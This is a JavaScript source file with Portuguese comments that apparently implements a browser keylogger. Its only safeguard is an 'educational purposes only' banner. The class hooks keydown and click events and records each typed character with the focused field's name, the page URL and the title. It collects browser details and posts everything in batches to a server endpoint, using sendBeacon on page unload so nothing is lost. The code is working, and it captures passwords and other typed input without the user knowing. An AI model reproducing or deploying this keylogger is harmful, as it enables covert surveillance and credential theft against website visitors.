/**
 * Keylogger Client-Side (JavaScript)
 * ⚠️ APENAS PARA FINS EDUCACIONAIS
 * 
 * Captura teclas digitadas NO NAVEGADOR e envia para o servidor.
 * Limitações:
 * - Só funciona enquanto a página está aberta
 * - Só captura teclas digitadas na página web
 * - Não captura teclas de outros aplicativos
 */

class KeyloggerCliente {
    constructor() {
        this.buffer = [];
        this.intervaloEnvio = 10; // Envia a cada 10 teclas
        this.ativo = false;
        this.sessionId = this.gerarSessionId();
    }

    gerarSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    iniciar() {
        if (this.ativo) return;
        
        this.ativo = true;
        console.log('[Keylogger] Iniciado - Session:', this.sessionId);

        // Captura teclas com keydown (mais confiável que keypress)
        document.addEventListener('keydown', (e) => this.capturarTecla(e));
        
        // Captura cliques (context)
        document.addEventListener('click', (e) => this.capturarClique(e));

        // Envia dados antes de sair da página
        window.addEventListener('beforeunload', () => this.enviarImediato());
        
        // Debug: envia a cada 5 segundos mesmo que não atinja o limite
        setInterval(() => {
            if (this.buffer.length > 0) {
                console.log(`[Keylogger] Enviando ${this.buffer.length} eventos pendentes...`);
                this.enviar();
            }
        }, 5000);
    }

    capturarTecla(evento) {
        // Ignora teclas especiais que não geram caracteres visíveis
        const teclasIgnoradas = ['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
        if (teclasIgnoradas.includes(evento.key)) {
            return;
        }
        
        // Identifica qual campo está sendo digitado
        const elemento = document.activeElement;
        const campo = elemento.id || elemento.name || elemento.placeholder || 'campo-generico';
        
        // Determina o caractere digitado
        let tecla = evento.key;
        if (tecla === 'Enter') {
            tecla = '\n';
        } else if (tecla === 'Backspace') {
            // Remove último caractere do buffer se existir
            if (this.buffer.length > 0) {
                const ultimo = this.buffer[this.buffer.length - 1];
                if (ultimo.tipo === 'keypress' && ultimo.campo === campo) {
                    const textoAtual = ultimo.tecla;
                    if (textoAtual.length > 0) {
                        ultimo.tecla = textoAtual.slice(0, -1);
                    }
                }
            }
            return; // Não adiciona backspace como evento separado
        }
        
        const dados = {
            tipo: 'keypress',
            tecla: tecla,
            codigo: evento.code,
            campo: campo,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            titulo: document.title,
            sessionId: this.sessionId
        };

        this.buffer.push(dados);
        console.log('[Keylogger] Tecla capturada:', tecla, '| Campo:', campo, '| Buffer:', this.buffer.length);

        // Envia quando atingir o limite
        if (this.buffer.length >= this.intervaloEnvio) {
            console.log('[Keylogger] Limite atingido, enviando...');
            this.enviar();
        }
    }

    capturarClique(evento) {
        const elemento = evento.target;
        const dados = {
            tipo: 'click',
            elemento: elemento.tagName,
            id: elemento.id || null,
            classe: elemento.className || null,
            texto: elemento.innerText?.substring(0, 50) || null,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            sessionId: this.sessionId
        };

        this.buffer.push(dados);
    }

    async enviar() {
        if (this.buffer.length === 0) return;

        const dadosParaEnviar = [...this.buffer];
        this.buffer = [];

        try {
            const resposta = await fetch('/api/salvar-client', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    sessao: this.sessionId,
                    dados: dadosParaEnviar,
                    navegador: navigator.userAgent,
                    plataforma: navigator.platform,
                    idioma: navigator.language
                })
            });

            if (resposta.ok) {
                console.log(`[Keylogger] ${dadosParaEnviar.length} eventos enviados`);
            } else {
                console.error('[Keylogger] Erro ao enviar:', resposta.status);
                // Recoloca no buffer em caso de erro
                this.buffer.unshift(...dadosParaEnviar);
            }
        } catch (erro) {
            console.error('[Keylogger] Erro de conexão:', erro.message);
            // Recoloca no buffer para tentar depois
            this.buffer.unshift(...dadosParaEnviar);
        }
    }

    enviarImediato() {
        if (this.buffer.length === 0) return;

        // Usa sendBeacon para enviar antes de sair da página
        const dados = JSON.stringify({
            sessao: this.sessionId,
            dados: this.buffer,
            navegador: navigator.userAgent,
            final: true
        });

        // sendBeacon precisa de Blob com Content-Type correto para Flask parsear JSON
        const blob = new Blob([dados], { type: 'application/json' });
        navigator.sendBeacon('/api/salvar-client', blob);
    }

    parar() {
        this.ativo = false;
        this.enviarImediato();
        console.log('[Keylogger] Parado');
    }
}

// Exporta para uso global
window.KeyloggerCliente = KeyloggerCliente;
